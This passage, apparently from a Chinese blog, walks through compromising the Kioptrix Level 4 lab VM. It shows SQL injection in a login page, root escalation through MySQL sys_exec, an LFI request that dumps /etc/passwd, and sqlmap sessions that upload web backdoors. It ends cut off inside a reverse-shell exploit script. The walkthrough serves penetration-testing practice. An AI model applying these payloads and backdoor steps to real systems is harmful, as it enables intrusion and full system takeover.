<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">john@Kioptrix4:/var/www$ ls</span><br><span class="line">checklogin.php  index.php          logout.php  tmpbbmjx.php  tmpbtzfy.php  tmpuijdt.php</span><br><span class="line">database.sql    john               member.php  tmpbdorc.php  tmpubjrn.php  tmpureio.php</span><br><span class="line">images          login_success.php  robert      tmpbstyp.php  tmpuepxr.php  tmpuyhae.php</span><br><span class="line"></span><br><span class="line">john@Kioptrix4:/var/www$ cat checklogin.php</span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line"><span class="variable">$host</span>=<span class="string">&quot;localhost&quot;</span>; // Host name</span><br><span class="line"><span class="variable">$username</span>=<span class="string">&quot;root&quot;</span>; // Mysql username</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;&quot;</span>; // Mysql password</span><br><span class="line"><span class="variable">$db_name</span>=<span class="string">&quot;members&quot;</span>; // Database name</span><br><span class="line"><span class="variable">$tbl_name</span>=<span class="string">&quot;members&quot;</span>; // Table name</span><br><span class="line"></span><br><span class="line">// Connect to server and select databse.</span><br><span class="line">mysql_connect(<span class="string">&quot;<span class="variable">$host</span>&quot;</span>, <span class="string">&quot;<span class="variable">$username</span>&quot;</span>, <span class="string">&quot;<span class="variable">$password</span>&quot;</span>)or die(<span class="string">&quot;cannot connect&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&quot;<span class="variable">$db_name</span>&quot;</span>)or die(<span class="string">&quot;cannot select DB&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Define <span class="variable">$myusername</span> and <span class="variable">$mypassword</span></span><br><span class="line"><span class="variable">$myusername</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;myusername&#x27;</span>];</span><br><span class="line"><span class="variable">$mypassword</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mypassword&#x27;</span>];</span><br><span class="line"></span><br><span class="line">// To protect MySQL injection (more detail about MySQL injection)</span><br><span class="line"><span class="variable">$myusername</span> = stripslashes(<span class="variable">$myusername</span>);</span><br><span class="line">//<span class="variable">$mypassword</span> = stripslashes(<span class="variable">$mypassword</span>);</span><br><span class="line"><span class="variable">$myusername</span> = mysql_real_escape_string(<span class="variable">$myusername</span>);</span><br><span class="line">//<span class="variable">$mypassword</span> = mysql_real_escape_string(<span class="variable">$mypassword</span>);</span><br><span class="line"></span><br><span class="line">//<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM <span class="variable">$tbl_name</span> WHERE username=&#x27;<span class="variable">$myusername</span>&#x27; and password=&#x27;<span class="variable">$mypassword</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="string">&quot;SELECT * FROM <span class="variable">$tbl_name</span> WHERE username=&#x27;<span class="variable">$myusername</span>&#x27; and password=&#x27;<span class="variable">$mypassword</span>&#x27;&quot;</span>);</span><br><span class="line">//<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">// Mysql_num_row is counting table row</span><br><span class="line"><span class="variable">$count</span>=mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">// If result matched <span class="variable">$myusername</span> and <span class="variable">$mypassword</span>, table row must be 1 row</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>!=0)&#123;</span><br><span class="line">// Register <span class="variable">$myusername</span>, <span class="variable">$mypassword</span> and redirect to file <span class="string">&quot;login_success.php&quot;</span></span><br><span class="line">        session_register(<span class="string">&quot;myusername&quot;</span>);</span><br><span class="line">        session_register(<span class="string">&quot;mypassword&quot;</span>);</span><br><span class="line">        header(<span class="string">&quot;location:login_success.php?username=<span class="variable">$myusername</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Wrong Username or Password&quot;</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&lt;form method=&quot;link&quot; action=&quot;index.php&quot;&gt;&lt;input type=submit value=&quot;Try Again&quot;&gt;&lt;/form&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>不需要密码即可访问数据库。 由于我们MySQL的root访问权限，因此可以使用用户定义的函数执行命令（在操作系统本身上）。 因为可以以root用户身份访问MySQL服务器，所以我们将使用用户定义函数将特权升级为root用户。 为了执行这些命令，我们需要确保lib_mysqludf_sys.so在服务器上。 使用whereis命令，我发现它已经安装在服务器上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john@Kioptrix4:/var/www$ whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh john@192.168.84.139</span></span><br><span class="line">john@192.168.84.139<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to LigGoat Security Systems - We are Watching</span></span><br><span class="line"><span class="string">== Welcome LigGoat Employee ==</span></span><br><span class="line"><span class="string">LigGoat Shell is in place so you  don&#x27;</span>t screw up</span><br><span class="line">Type <span class="string">&#x27;?&#x27;</span> or <span class="string">&#x27;help&#x27;</span> to get the list of allowed commands</span><br><span class="line">john:~$ <span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">john@Kioptrix4:~$ ls</span><br><span class="line">john@Kioptrix4:~$ mysql -h localhost -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 6760</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_exec(<span class="string">&#x27;usermod -a -G admin john&#x27;</span>);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| sys_exec(<span class="string">&#x27;usermod -a -G admin john&#x27;</span>) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| NULL                                 | </span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">exit</span>;                                       </span><br><span class="line">Bye</span><br><span class="line">john@Kioptrix4:~$ sudo su</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># MyNameIsJohn</span></span><br><span class="line">bash: MyNameIsJohn: <span class="built_in">command</span> not found</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment">#</span></span><br><span class="line">root@Kioptrix4:~<span class="comment"># cat congrats.txt</span></span><br><span class="line">Congratulations!</span><br><span class="line">You<span class="string">&#x27;ve got root.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">There is more then one way to get root on this system. Try and find them.</span></span><br><span class="line"><span class="string">I&#x27;</span>ve only tested two (2) methods, but it doesn<span class="string">&#x27;t mean there aren&#x27;</span>t more.</span><br><span class="line">As always there<span class="string">&#x27;s an easy way, and a not so easy way to pop this box.</span></span><br><span class="line"><span class="string">Look for other methods to get root privileges other than running an exploit.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It took a while to make this. For one it&#x27;</span>s not as easy as it may look, and</span><br><span class="line">also work and family life are my priorities. Hobbies are low on my list.</span><br><span class="line">Really hope you enjoyed this one.</span><br><span class="line"></span><br><span class="line">If you haven<span class="string">&#x27;t already, check out the other VMs available on:</span></span><br><span class="line"><span class="string">www.kioptrix.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Thanks for playing,</span></span><br><span class="line"><span class="string">loneferret</span></span><br></pre></td></tr></table></figure>

<p>使用sys_exec，可以运行将john添加到admin组的usermod，然后运行sudo su以获得root权限的shell,至此渗透靶机的目标已经完成。</p>
<h3 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h3><p>由于受sock_sendpage（）NULL指针取消引用攻击，还能使用内核提权脚本进行提权，具体方法自行google，常规操作就不在此赘述.</p>
<ul>
<li>文件包含</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(请求包)</span><br><span class="line"></span><br><span class="line">GET /member.php?username=/etc/etc/passwd%00 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.84.139</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=b5a332dd49e1d5192ffb8915fa3e7f84</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">(响应包)</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line"></span><br><span class="line">Date: Tue, 10 Dec 2019 16:39:07 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line"></span><br><span class="line">X-Powered-By: PHP/5.2.4-2ubuntu5.6</span><br><span class="line"></span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"></span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line"></span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">location: index.php</span><br><span class="line"></span><br><span class="line">Content-Length: 1146</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">klog:x:103:104::/home/klog:/bin/<span class="literal">false</span></span><br><span class="line">mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash</span><br><span class="line">john:x:1001:1001:,,,:/home/john:/bin/kshell</span><br><span class="line">robert:x:1002:1002:,,,:/home/robert:/bin/kshell</span><br></pre></td></tr></table></figure>

<ul>
<li>sqlmap的os-shell功能</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(判断是否具有dba权限)</span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt --is-dba</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                         </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                            </span></span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |                                                                            </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                            </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                          </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:12:43 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:12:43] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[04:12:43] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] heuristics detected web page charset &#x27;</span>ascii<span class="string">&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27;</span> OR 1343=1343<span class="comment">#&amp;Submit=Login</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123456<span class="string">&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] testing if current user is DBA</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] fetching current user</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] resumed: root@localhost</span></span><br><span class="line"><span class="string">current user is DBA: True</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/192.168.84.139<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:12:43 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(如果有，如下所示getshell)</span></span><br><span class="line"><span class="string">root@kali:~# sqlmap -r sqlmap.txt --os-shell</span></span><br><span class="line"><span class="string">        ___</span></span><br><span class="line"><span class="string">       __H__                                                                                         </span></span><br><span class="line"><span class="string"> ___ ___[.]_____ ___ ___  &#123;1.3.11#stable&#125;                                                            </span></span><br><span class="line"><span class="string">|_ -| . [.]     | .&#x27;</span>| . |                                                                            </span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|                                                                            </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                          </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:10:50 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:10:50] [INFO] parsing HTTP request from &#x27;sqlmap.txt&#x27;</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[04:10:50] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] heuristics detected web page charset &#x27;ascii&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27; OR 1343=1343#&amp;Submit=Login</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=123456&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">which web application language does the web server support?</span></span><br><span class="line"><span class="string">[1] ASP</span></span><br><span class="line"><span class="string">[2] ASPX</span></span><br><span class="line"><span class="string">[3] JSP</span></span><br><span class="line"><span class="string">[4] PHP (default)</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] retrieved the web server document root: &#x27;/var/www&#x27;</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] retrieved web server absolute paths: &#x27;/var/www/checklogin.php&#x27;</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] trying to upload the file stager on &#x27;/var/www/&#x27; via LIMIT &#x27;LINES TERMINATED BY&#x27; method</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] the file stager has been successfully uploaded on &#x27;/var/www/&#x27; - http://192.168.84.139:80/tmpuhuus.php</span></span><br><span class="line"><span class="string">[04:10:51] [WARNING] unable to upload the file through the web file stager to &#x27;/var/www/&#x27;</span></span><br><span class="line"><span class="string">[04:10:51] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder where the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers</span></span><br><span class="line"><span class="string">[04:10:53] [INFO] the backdoor has been successfully uploaded on &#x27;/var/www/&#x27; - http://192.168.84.139:80/tmpbhqem.php</span></span><br><span class="line"><span class="string">[04:10:53] [INFO] calling OS shell. To quit type &#x27;x&#x27; or &#x27;q&#x27; and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; ls</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">checklogin.php</span></span><br><span class="line"><span class="string">database.sql</span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">john</span></span><br><span class="line"><span class="string">login_success.php</span></span><br><span class="line"><span class="string">logout.php</span></span><br><span class="line"><span class="string">member.php</span></span><br><span class="line"><span class="string">robert</span></span><br><span class="line"><span class="string">tmpbbmjx.php</span></span><br><span class="line"><span class="string">tmpbdorc.php</span></span><br><span class="line"><span class="string">tmpbhqem.php</span></span><br><span class="line"><span class="string">tmpbstyp.php</span></span><br><span class="line"><span class="string">tmpbtzfy.php</span></span><br><span class="line"><span class="string">tmpubjrn.php</span></span><br><span class="line"><span class="string">tmpuepxr.php</span></span><br><span class="line"><span class="string">tmpuhuus.php</span></span><br><span class="line"><span class="string">tmpuijdt.php</span></span><br><span class="line"><span class="string">tmpureio.php</span></span><br><span class="line"><span class="string">tmpuyhae.php</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt; </span></span><br></pre></td></tr></table></figure>

<p>sqlmap自带的文件上传payload</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub36.jpg"></p>
<p>如果传不了，直接用下列命令写马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt --file-write /root/shells/php/bullfuck.php --file-dest /var/www/bullshit.php        ___</span></span><br><span class="line">       __H__                                                                                                                                                    </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                                                                                                         </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                                                                                                                 </span><br><span class="line">|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                  </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                                                </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:42:12 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:42:12] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[04:42:12] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] heuristics detected web page charset &#x27;</span>ascii<span class="string">&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27;</span> OR 1343=1343<span class="comment">#&amp;Submit=Login</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123456<span class="string">&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">[04:42:12] [WARNING] expect junk characters inside the file as a leftover from original query</span></span><br><span class="line"><span class="string">[04:42:14] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;</span>--threads<span class="string">&#x27; for faster data retrievalDBMS file system (&#x27;</span>/var/www/bullshit.php<span class="string">&#x27;)? [Y/n] </span></span><br><span class="line"><span class="string">[04:42:14] [INFO] retrieved: </span></span><br><span class="line"><span class="string">sqlmap got a 302 redirect to &#x27;</span>http://192.168.84.139:80/login_success.php?username=admin<span class="string">&#x27;. Do you want to follow? [Y/n] n</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">[04:42:17] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)</span></span><br><span class="line"><span class="string">[04:42:17] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/192.168.84.139<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:42:17 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(成功写入)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:                                                                                                      </span></span><br><span class="line"><span class="string">---                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">checklogin.php                                                                                                                                                                             </span></span><br><span class="line"><span class="string">database.sql                                                                                                                                                                               </span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">john</span></span><br><span class="line"><span class="string">login_success.php</span></span><br><span class="line"><span class="string">logout.php</span></span><br><span class="line"><span class="string">member.php</span></span><br><span class="line"><span class="string">robert</span></span><br><span class="line"><span class="string">tmpbokko.php</span></span><br><span class="line"><span class="string">tmpuvljz.php</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt; ls</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">bullshit.php</span></span><br><span class="line"><span class="string">checklogin.php</span></span><br><span class="line"><span class="string">database.sql</span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">john</span></span><br><span class="line"><span class="string">login_success.php</span></span><br><span class="line"><span class="string">logout.php</span></span><br><span class="line"><span class="string">member.php</span></span><br><span class="line"><span class="string">robert</span></span><br><span class="line"><span class="string">tmpbokko.php</span></span><br><span class="line"><span class="string">tmpuvljz.php</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>下面再附上希腊某位大佬的傻瓜式通关脚本;)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use LWP::UserAgent;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Coded by mr.pr0n - https://ghostinthelab.wordpress.com - (@_pr0n_)</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;------------------------------------\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot; Kioptrix Level 4 - Run2Shell Script\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;------------------------------------\n&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address of the Kioptrix box (e.g.: http://192.168.178.21)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$target</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$target</span>);</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://&quot;</span>.<span class="variable">$target</span> <span class="keyword">if</span> (<span class="variable">$target</span> !~ /^http:/);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address for the reverse connection (e.g.: 192.168.178.27)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$ip</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$ip</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the port to connect back on (e.g.: 4444)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$port</span>);</span><br><span class="line"> </span><br><span class="line">menu:;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n[+] Main Menu:\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;    1. Limited Shell\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;    2. Root Shell.\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;    3. Exit.\n&quot;</span>    ;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$option</span>=&lt;STDIN&gt;;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>!=1 &amp;&amp; <span class="variable">$option</span>!=2 &amp;&amp; 